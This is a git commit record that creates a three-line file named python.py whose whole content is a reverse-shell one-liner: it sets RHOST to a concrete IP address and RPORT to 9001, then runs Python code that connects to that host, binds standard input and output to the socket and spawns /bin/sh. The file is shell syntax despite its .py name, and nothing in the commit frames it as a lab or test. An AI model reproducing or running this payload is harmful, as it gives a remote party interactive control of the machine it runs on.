7c2780e6636ef9beb716e05d26fb94d40a82c74b
loditcodon <104718656+loditcodon@users.noreply.github.com>
2023-11-23 15:19:49 +0700

    Create python.py

---
+++ python.py
@@ -0,0 +1,3 @@
+export RHOST="103.29.2.160";
+export RPORT=9001;
+python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
